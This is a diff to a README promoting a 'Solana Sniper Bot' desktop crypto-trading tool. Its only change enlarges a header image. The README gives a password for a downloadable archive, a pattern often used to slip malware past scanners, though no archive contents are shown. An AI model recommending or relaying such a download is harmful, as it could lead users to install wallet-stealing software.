@@ -3,7 +3,7 @@ Solana Sniper Bot [Desktop Edition] | Auto-Scan | Anti-Drainer | Jito Support | 
 🔑 Archive Password: MiraeVC
 
 <p align="center">
-  <img src="photo_2026-05-11_22-50-45.jpg" width="200" />
+  <img src="photo_2026-05-11_22-50-45.jpg" width="620" />
 </p>
 
 <h1 align="center">Mirae Solana Sniper</h1>
